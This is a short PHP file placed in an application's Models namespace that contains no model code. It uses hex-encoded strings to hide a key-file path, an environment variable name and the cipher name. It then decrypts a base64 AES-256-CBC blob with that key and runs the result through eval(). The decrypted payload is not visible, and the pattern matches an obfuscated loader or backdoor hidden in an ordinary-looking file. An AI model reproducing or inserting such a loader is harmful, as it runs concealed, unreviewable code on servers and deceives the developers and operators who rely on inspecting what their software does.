<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wYLCRKgH/9/8ut21XpXQOw==');

$c=base64_decode(

'4hzPGMg4T+cnbBcndnb9sxIVe6VHL59pw73UJjr0AKqGNXdSxVadoaS33tPHhJDv5bt79h2aaFjv' .
'Z0+EuwMGkbwMdZXGMP23wQV7I7TjsWod/X51q57Yac10/jEjZn8a5kuCZuVp1ItxPgy9PdqPWKIi' .
'U9TPuKAMUy4XOjUlbDZqgbhsRI9Ac79sxy8ekc3lbXU8IVvt1OGjwgs6+GYNFzspED+66oTPmq6+' .
't07RMVFjY8lKlduLIlB/DBc1kmnEHqIBvPcTmUH3KUSYuDNTVh2IH6oB7YqHIlpWmUX9Q8857aDY' .
'j0N0YKSSBIyKvqKmO13GLHQSabC3E4eSqP6+h0sMtsHS1DsWbkz6MpLOgDELDuLk63jPMwOMG02l' .
'GhR6oJ5tLI+V/wHrQccQ94IvV1qRcSrLd6oijWHs5Y9AI2BDDFqC7cg6U8SgeQCVQqfhpxZuTdw2' .
'fUdDTuFNLiqlEJK5MoiodVC0UFGMAmKaLZwMMLTJJcyBKAiUEhDPOj0ZGIwfhcQ5CJMhbEQAmhmf' .
'rC4PNoQ2X9YD8YS5LY9uyneUd5nLEcHNdfujDmU9nkNOfjkuFsQehaA0N4uD58b7u/m61ZcwLtZm' .
'OGCEiluiZNL/Bd1CIlYJXUoApUDSjkahjyvh8R7RwZialUF2THP+XatcRFJTvLmSzFshs6j7I+uk' .
'Hm1NxxxaWuvAYmU9sN+Zj0tzoWGXLJKXA5UOu5jSGgC8lV6Hz0znkiR5auJgtyTOG9Z3utvU0Htv' .
'1zp5h7prls0TYLLof24moNgx8vnyNA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

